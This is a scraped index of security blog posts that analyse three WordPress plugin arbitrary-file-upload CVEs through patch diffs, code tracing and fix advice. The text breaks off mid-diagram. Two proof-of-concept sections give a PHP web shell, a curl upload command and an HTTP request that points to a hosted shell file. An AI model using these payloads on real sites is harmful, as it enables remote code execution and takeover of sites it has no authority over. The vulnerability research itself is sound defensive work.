=\u003e true is used, enabling MIME checks against the whitelist and preventing uploads of dangerous files like .php web shells. ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code Question Before tracing further, I want to inspect wp_handle_upload() to answer two questions: Why does removing 'test_type' =\u003e false enable MIME whitelist checks? What does that whitelist include? wp_handle_upload() is a wrapper for _wp_handle_upload() wordpress/wp-admin/includes/file.php function wp_handle_upload( \u0026$file, $overrides = false, $time = null ) { /* * $_POST['action'] must be set and its value must equal $overrides['action'] * or this: */ $action = 'wp_handle_upload'; if ( isset( $overrides['action'] ) ) { $action = $overrides['action']; } return _wp_handle_upload( $file, $overrides, $time, $action ); } wp_handle_upload() sets $action and calls _wp_handle_upload(). In the file containing _wp_handle_upload(), line 915 wordpress/wp-admin/includes/file.php $test_type = isset( $overrides['test_type'] ) ? $overrides['test_type'] : true; 👉 This assigns the value to $test_type — if $overrides contains the 'test_type' key, its value is used; otherwise the default is true. So when we don’t pass test_type or pass test_type =\u003e true, $test_type is true. At lines 953-973 wordpress/wp-admin/includes/file.php if ( $test_type ) { $wp_filetype = wp_check_filetype_and_ext( $file['tmp_name'], $file['name'], $mimes ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; // Check to see if wp_check_filetype_and_ext() determined the filename was incorrect. if ( $proper_filename ) { $file['name'] = $proper_filename; } if ( ( ! $type || ! $ext ) \u0026\u0026 ! current_user_can( 'unfiltered_upload' ) ) { return call_user_func_array( $upload_error_handler, array( \u0026$file, __( 'Sorry, you are not allowed to upload this file type.' ) ) ); } if ( ! $type ) { $type = $file['type']; } } else { $type = ''; } If $test_type = true, the function calls wp_check_filetype_and_ext() to validate the file extension and MIME type based on WordPress’s allowed whitelist. If the file lacks an allowed extension or MIME type, and the user does not have the unfiltered_upload capability, the upload is rejected. Lines 3089-3315 wordpress/wp-includes/functions.php function wp_check_filetype_and_ext( $file, $filename, $mimes = null ) { $proper_filename = false; // Do basic extension validation and MIME mapping. $wp_filetype = wp_check_filetype( $filename, $mimes ); ... // Validate image types. // Validate files that didn't get validated during previous checks. // The mime type must be allowed. ... } wp_check_filetype_and_ext() calls wp_check_filetype() to perform basic extension validation and MIME mapping. Line 3045-3062 wordpress/wp-includes/functions.php function wp_check_filetype( $filename, $mimes = null ) { if ( empty( $mimes ) ) { $mimes = get_allowed_mime_types(); } $type = false; $ext = false; foreach ( $mimes as $ext_preg =\u003e $mime_match ) { $ext_preg = '!\\.(' . $ext_preg . ')$!i'; if ( preg_match( $ext_preg, $filename, $ext_matches ) ) { $type = $mime_match; $ext = $ext_matches[1]; break; } } return compact( 'ext', 'type' ); } wp_check_filetype() only checks the file extension against WordPress’s MIME whitelist — it does not verify the actual file content. The function calls get_allowed_mime_types() to retrieve the list of allowed MIME types. Line 3640-3661 wordpress/wp-includes/functions.php function get_allowed_mime_types( $user = null ) { $t = wp_get_mime_types(); unset( $t['swf'], $t['exe'] ); if ( function_exists( 'current_user_can' ) ) { $unfiltered = $user ? user_can( $user, 'unfiltered_html' ) : current_user_can( 'unfiltered_html' ); } if ( empty( $unfiltered ) ) { unset( $t['htm|html'], $t['js'] ); } /** * Filters the list of allowed mime types and file extensions. * * @since 2.0.0 * * @param array $t Mime types keyed by the file extension regex corresponding to those types. * @param int|WP_User|null $user User ID, User object or null if not provided (indicates curr","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"] B --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"] C --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"] D --\u003e E[\"foreach $files as $name =\u003e $file\"] E --\u003e F[\"if array_key_exists($name, $meta)\"] F --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"] G --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"] H --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"] I --\u003e J[\"File written to /wp-content/uploads → possible RCE\"] graph TD A[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"] B --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"] C --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"] D --\u003e E[\"foreach $files as $name =\u003e $file\"] E --\u003e F[\"if array_key_exists($name, $meta)\"] F --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"] G --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"] H --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"] I --\u003e J[\"File written to /wp-content/uploads → possible RCE\"] graph TD A[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"] B --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"] C --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"] D --\u003e E[\"foreach $files as $name =\u003e $file\"] E --\u003e F[\"if array_key_exists($name, $meta)\"] F --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"] G --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"] H --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"] I --\u003e J[\"File written to /wp-content/uploads → possible RCE\"] graph TD A[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"] B --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"] C --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"] D --\u003e E[\"foreach $files as $name =\u003e $file\"] E --\u003e F[\"if array_key_exists($name, $meta)\"] F --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"] G --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"] H --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"] I --\u003e J[\"File written to /wp-content/uploads → possible RCE\"] ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a .php file containing a web shell: \u003c?php system($_REQUEST[\"cmd\"]) ?\u003e Send a POST request: curl -X POST \"http://localhost\" -F \"tinv_wishlist_id=1\" -F \"product_id=1\" -F \"form[image]=1\" -F \"image=@rce.php\" RCE via file upload RCE via file upload ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-47577 vulnerability originates from disabling MIME type checks (test_type =\u003e false) in the wp_handle_upload() call, allowing an attacker to upload arbitrary files, including malicious PHP code. Once a file is uploaded into /wp-content/uploads/, it may be directly accessible and used to execute remote code (RCE). The 2.10.0 patch restores MIME checking, ensuring only file types listed in WordPress’s whitelist are allowed for upload. ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway Always enforce MIME type and file extension checks when handling uploads. Do not override WordPress’s default security mechanisms such as test_type. When analyzing vulnerabilities, comparing patch diffs quickly reveals the root cause. Plugin developers should regularly audit hooks and filters related to uploads to prevent RCE risks. ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References Arbitrary File Upload WordPress TI WooCommerce Wishlist Plugin \u003c= 2.9.2 is vulnerable to Arbitrary File Upload ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Embed PDF for WPForms Plugin.","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Embed PDF for WPForms plugin for WordPress contains a vulnerability that allows arbitrary file uploads due to missing file type checks in the ajax_handler_download_pdf_media function in all versions up to and including 1.1.5. This allows an authenticated attacker with access level Subscriber or higher to upload arbitrary files to the affected site’s server, which may lead to remote code execution. CVE ID: CVE-2025-10647 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.1.5 Patched Versions: 1.1.6 CVSS severity: High (9.9) Required Privilege: Subscriber Product: WordPress Embed PDF for WPForms Plugin ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Embed PDF for WPForms: 1.1.5 (vulnerable) and 1.1.6 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between versions. WPForms Plugin ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff class-wpforms-field-pdf-viewer.php - v1.1.5 public function ajax_handler_download_pdf_media() { check_ajax_referer( 'epdf_wf_download_pdf_media' ); if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); // Download the file. $tmp_file = download_url( $url ); if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( /* translators: 1. An error message. */ 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } // Move from a temp file to the uploads directory. $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); $wp_filesystem-\u003emove( $tmp_file, $path ); ... } In the vulnerable version, the ajax_handler_download_pdf_media() function downloads a PDF file from the provided URL into WordPress’s Media Library via AJAX but does not check the file type or user capabilities. Bug An attacker could upload a .php file to achieve RCE class-wpforms-field-pdf-viewer.php - v1.1.6 public function ajax_handler_download_pdf_media() { check_ajax_referer( 'epdf_wf_download_pdf_media' ); if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); if ( ! wp_check_filetype( basename( $url ) )['type'] ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } // Download the file. $tmp_file = download_url( $url ); if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( /* translators: 1. An error message. */ 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } // Move from a temp file to the uploads directory. $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); $wp_filesystem-\u003emove( $tmp_file, $path ); ... } The patch: Adds a user capability check: if ( ! current_user_can( 'upload_files' ) ) { ... } Only users with upload capability can invoke the handler. Restricts accepted uploaded file types: if ( ! wp_check_filetype( basename( $url ) )['type'] ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } wp_check_filetype() (WP Core) returns two keys: array( 'ext' =\u003e string|false, 'type' =\u003e string|false ) If type is not found in wp_get_mime_types() it returns false. By default this accepts only non-executable file types (does not accept php). ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code The ajax_handler_download_pdf_media() function: Checks the CSRF nonce check_ajax_referer( 'epdf_wf_download_pdf_media' ); Searching for the epdf_wf_download_pdf_media key in the plugin source code directory Nonce is created with key `_ajax_nonce` The nonce is created with key _ajax_nonce and stored in the epdf_wf_pdf_viewer_strings object — its value can be retrieved in the browser console by calling epdf_wf_pdf_viewer_strings.nonce Retrieve nonce from browser console This nonce is generated after visiting the page created by WPForms using the PDF Viewer Create a form using WPForms with PDF Viewer The form is embedded into a WordPress Post/Page. Validate incoming data if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } If the request has no url, the function returns a JSON error and stops execution. Sanitize and obtain the URL $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); wp_unslash() removes slashes added by WordPress when sending POST data. esc_url_raw() sanitizes the URL before using it to download the file. Download the file to the server (temporary) $tmp_file = download_url( $url ); download_url() downloads the file from the URL to a temporary file on the server. Returns the path to the temporary file on success, or a WP_Error on failure. if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } If the download fails → return JSON error with the error message. Determine the upload directory and filename $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; wp_upload_dir() returns an array with upload directory info: path, URL, subdir, … wp_unique_filename() ensures the filename does not conflict with existing files. $path is the full path where the file will be saved. $upload_dir['path'] typically looks like wp-content/uploads/year/month Initialize the WordPress Filesystem global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); Move the temporary file to the uploads directory $wp_filesystem-\u003emove( $tmp_file, $path ); Moves the file from temp ($tmp_file) to uploads ($path). Uses $wp_filesystem-\u003emove() instead of rename() for compatibility with environments (Direct, FTP, …). The ajax_handler_download_pdf_media() function is registered as a callback for the action hook: add_action( 'wp_ajax_epdf_wf_download_pdf_media', array( $this, 'ajax_handler_download_pdf_media' ) ); This means: wp_ajax_ requests require the user to be logged in (at least a Subscriber) to be accepted. epdf_wf_download_pdf_media is the action passed as a parameter. When a logged-in user sends a request to the /wp-admin/admin-ajax.php endpoint with action=epdf_wf_download_pdf_media, ajax_handler_download_pdf_media() is called to handle the request. ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Subscriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"] B --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"] C --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"] D --\u003e E{\"is_wp_error($tmp_file) ?\"} E -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"] E -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"] graph TD A[\"Subscriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"] B --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"] C --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"] D --\u003e E{\"is_wp_error($tmp_file) ?\"} E -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"] E -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"] graph TD A[\"Subscriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"] B --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"] C --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"] D --\u003e E{\"is_wp_error($tmp_file) ?\"} E -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"] E -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"] graph TD A[\"Subscriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"] B --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"] C --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"] D --\u003e E{\"is_wp_error($tmp_file) ?\"} E -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"] E -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"] ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Visit the page containing the form created by WPForms using the PDF Viewer Retrieve the nonce Create a .php file containing RCE code and host it on the internet \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Send a POST request with the url pointing to the hosted file POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7C69db0f51f219492ec3f150bb86bc1364f7cd33442587ddf3f1bf334e4cdec409; wp-settings-time-2=1761725656; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wp-settings-2=editor%3Dtinymce%26libraryContent%3Dbrowse; wp-settings-time-3=1761711790; wp-settings-3=libraryContent%3Dbrowse; _lscache_vary=fff4fa950d2b9daa95c3289bb2a7040a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7Ca7cb9996e74be71e18c68f339c0ad07a43687c7eb701f89fe90374cc2a783131; wp-settings-time-5=1761992371 ... _ajax_nonce=ea2ccf0ccd\u0026action=epdf_wf_download_pdf_media\u0026url=https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php Access the uploaded file and achieve RCE RCE via file upload ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability allowing arbitrary file upload in ajax_handler_download_pdf_media() was caused by missing checks for user capabilities and file type when downloading files from a URL, enabling an attacker with a Subscriber account to upload executable files (e.g., .php) and cause RCE. The developer fixed the issue by adding current_user_can('upload_files') and validating MIME types with wp_check_filetype() in version 1.1.6. For affected sites, update to 1.1.6 immediately, inspect and remove suspicious files in the uploads directory, and review user permissions and logs for signs of exploitation. ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway Always check user capabilities (current_user_can) before performing uploads via AJAX. Always validate file type/MIME (wp_check_filetype / whitelist) before saving files. Quickly update plugins when patches are available; review uploaded files and logs after disclosure. Apply the principle of least privilege and monitor for anomalous activity in media/uploads. ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References Arbitrary File Upload WordPress Embed PDF for WPForms Plugin \u003c= 1.1.5 is vulnerable to Arbitrary File Upload ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Podlove Podcast Publisher Plugin.","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Podlove Podcast Publisher plugin for WordPress has a vulnerability allowing arbitrary file uploads due to missing file type checks in the 'move_as_original_file' function in all versions up to and including 4.2.6. This enables unauthenticated attackers to upload arbitrary files to the affected site’s server, which can lead to remote code execution. CVE ID: CVE-2025-10147 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 4.2.6 Patched Versions: 4.2.7 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress Podlove Podcast Publisher Plugin ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Podlove Podcast Publisher: 4.2.6 (vulnerable) and 4.2.7 (patched). Diff tool - Meld or any diff tool to inspect and compare the differences between the two versions. ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code According to the CVE description the vulnerability is located in the move_as_original_file() function image.php - v2.6.6 public function move_as_original_file($file) { $move_new_file = @rename($file, $this-\u003eoriginal_file()); if (false === $move_new_file) { Log::get()-\u003eaddWarning( sprintf( __('Podlove Image Cache: The downloaded image could not be moved to %s.'), $this-\u003eoriginal_file() ) ); } } The move_as_original_file($file) function Performs a move of the temporary file $file (just downloaded from the URL) → to the fixed path returned by $this-\u003eoriginal_file(). rename() in PHP = move file (relocates the file, not copy). The @ operator suppresses PHP warnings if the operation fails. If rename() returns false, the plugin logs a warning. public function original_file() { return implode(DIRECTORY_SEPARATOR, [ $this-\u003eupload_basedir, $this-\u003efile_name('original') ]); } → Produces an absolute path on the server, for example: /var/www/html/wp-content/cache/podlove/6e/7262f37a8018efafa4764ea97a4c26/original.png $this-\u003eupload_basedir (from __construct()) image.php - v2.6.6 Class Image { public function __construct($url, $file_name = '') { // FIXME: if $file_name is empty, the url will not work. I must not treat this silently! $this-\u003esource_url = trim($url ?? ''); $this-\u003efile_name = sanitize_title($file_name); // manually remove troublemaking characters // @see https://community.podlove.org/t/solved-kind-of-cover-art-disappears-caching-issue/478/ // @see https://sendegate.de/t/problem-mit-caching-von-grafiken/2947 if (function_exists('iconv')) { $this-\u003efile_name = iconv('UTF-8', 'ASCII//TRANSLIT', $this-\u003efile_name); } $this-\u003efile_name = preg_replace('~[^-a-z0-9_]+~', '', $this-\u003efile_name); $this-\u003efile_extension = $this-\u003eextract_file_extension(); $this-\u003eid = md5($url.$this-\u003efile_name); // create subdirectories to avoid too many directories in the root directory $id_directory = substr($this-\u003eid, 0, 2).'/'.substr($this-\u003eid, 2); $this-\u003eupload_basedir = self::cache_dir().$id_directory; $this-\u003eupload_baseurl = content_url('cache/podlove/').$id_directory; } } Built from cache_dir() and an MD5 hash of the URL, → located under the directory: wp-content/cache/podlove/\u003cfirst 2 characters\u003e/\u003cremaining characters\u003e/ Tip Here you can pass only $url, for example: $url=\"https://example.com/filename.php\" then $this-\u003eid=\"b1555a128239e3f59ccfb8d17e5b6c5a\" $this-\u003eupload_basedir=\"http://localhost/wp-content/cache/podlove/b1/555a128239e3f59ccfb8d17e5b6c5a\" You can control the resulting file path. move_as_original_file() is called inside download_source() image.php - v2.6.6 public function download_source() { $source_url = $this-\u003esource_url; ... $source_domain = wp_parse_url($source_url, PHP_URL_HOST); $current_domain = explode(':', $_SERVER['HTTP_HOST'])[0]; // if domains match, see if the image is part of the Publisher // and can be copied on the filesystem, skipping http if ($current_domain == $source_domain) { ... return; } // for download_url() require_once ABSPATH.'wp-admin/includes/file.php'; $result = self::download_url($this-\u003esource_url); ... list($temp_file, $response) = $result; if (!\\Podlove\\is_image($temp_file)) { ... wp_delete_file($temp_file); return; } $this-\u003ecreate_basedir(); $this-\u003esave_cache_data($response); $this-\u003emove_as_original_file($temp_file); wp_delete_file($temp_file); $this-\u003eadd_donotbackup_dotfile(); } This function downloads the image from the user-provided URL, validates it, then saves it into the plugin’s cache directory. Specifically: $source_url takes the image URL provided by the user. The function extracts the domain from $source_url and the site’s current domain ($_SERVER['HTTP_HOST']). If the two domains match → the image is considered part of the Publisher and the logic returns. If different domains → it uses download_url() to fetch the file temporarily on the server. image.php - v2.6.6 public static function download_url($url, $timeout = 300, $extra_args = []) { ... $tmpfname = wp_tempnam($url); if (!$tmpf","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"] B --\u003e C[\"hex2str() → $source_url → new Image(...)\"] C --\u003e D[\"download_source() → download_url() → temporary file\"] D --\u003e E[\"is_image() check\"] E -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"] F --\u003e G[\"File accessible → possible RCE\"] E -- fail --\u003e H[\"Delete temp file → stop\"] graph TD A[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"] B --\u003e C[\"hex2str() → $source_url → new Image(...)\"] C --\u003e D[\"download_source() → download_url() → temporary 